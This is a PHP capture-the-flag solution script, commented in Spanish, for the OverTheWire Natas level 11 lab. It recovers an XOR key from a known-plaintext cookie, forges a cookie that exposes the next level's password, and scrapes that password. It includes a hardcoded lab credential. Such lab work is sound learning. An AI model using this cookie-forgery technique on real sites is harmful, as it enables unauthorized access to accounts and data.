<?php 
//Codificamos en formato json el array asociativo de los parametros para pasarla como clave en la función XOR
$defaultdata = json_encode(array("showpassword"=>"no", "bgcolor"=>"#ffffff"));
//Obtenemos la cookie cifrada de la web y la decodificamos de base 64, para pasarla como texto en la función XOR
$cookie = base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=");

//Función de encriptación XOR
function xor_encrypt($in, $in2){
    $key = $in2;
    $text = $in;
    $outText = "";

    //Iterate through each character
    for($i=0; $i<strlen($text); $i++){
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

//Llamamos a la función XOR y le pasamos la cookie y el arreglo en json, para obtener la clave
$key = xor_encrypt($cookie, $defaultdata);
//Como la clave se repite varias veces, dividimos la cadena larga en partes iguales en un arreglo, y esas partes equivalen a la key
$key = str_split($key, 4);
//Obtenmos la key del arreglo
$key = $key[0];

//Con ayuda de la clave obtenida, modificamos y ciframos los parametros para obtener una cookie cifrada
echo "Cookie cifrada con el valor 'yes': ".base64_encode(xor_encrypt(json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff")), $key))."\n";
$pass_cookie = base64_encode(xor_encrypt(json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff")), $key));

/*PETICIÓN GET A NATAS11*/
//Obteniendo la cookie la pasamos a la página web con una petición GET A NATAS11
// URL de la página PHP donde se establecerá la cookie
$url = 'http://natas11.natas.labs.overthewire.org/';

//Creedenciales de autorización
$natas11 = "natas11";
$pass_natas11 = "1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg";

//Credenciales coodificadas en base64
$credenciales_base64 = base64_encode("$natas11:$pass_natas11");

// Inicializa cURL
$ch = curl_init();

// Configura las opciones de cURL
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array("Authorization: Basic ".$credenciales_base64));
curl_setopt($ch, CURLOPT_COOKIE, "data=".$pass_cookie); // Establece la cookie
curl_setopt($ch, CURLOPT_HTTPGET, true);

// Realiza la solicitud GET
$response = curl_exec($ch);

// Cierra la sesión cURL
curl_close($ch);

// Imprime la respuesta
//echo $response;

/*Filtra el passNatas12 gracias a la expresión regular (.*)
donde el (.) define cualquier caracter y (*) que se pueden repetir
 */
$patron = '/The password for natas12 is (.*)<br>/';
//La variable $matches es un array que guarda la coincidencia del texto completo y la cadena del pass de natas12 de la expresion regular(.*)
if (preg_match($patron, $response, $matches)) {
    // Si se encuentra la cadena, la guardamos en una variable
    $pass_natas12 = $matches[1];
    echo "Pass de natas12: $pass_natas12";
} else {
    echo "No se encontro el pass de natas12";
}

/*PETICIÓN GET A NATAS12 PARA LOGEARNOS */
$url2 = 'http://natas12.natas.labs.overthewire.org/';

//Creedenciales de autorización
$natas12 = "natas12";
$pass_natas12 = $matches[1];

//Credenciales coodificadas en base64
$credenciales2_base64 = base64_encode("$natas12:$pass_natas12");

// Inicializa cURL
$ch2 = curl_init();

// Configura las opciones de cURL
curl_setopt($ch2, CURLOPT_URL, $url2);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch2, CURLOPT_HTTPHEADER, array("Authorization: Basic ".$credenciales2_base64));
curl_setopt($ch2, CURLOPT_COOKIE, "data=".$pass_cookie); // Establece la cookie
curl_setopt($ch2, CURLOPT_HTTPGET, true);

// Realiza la solicitud GET
$response2 = curl_exec($ch2);

// Cierra la sesión cURL
curl_close($ch2);

// Imprime la respuesta
echo $response2;

?>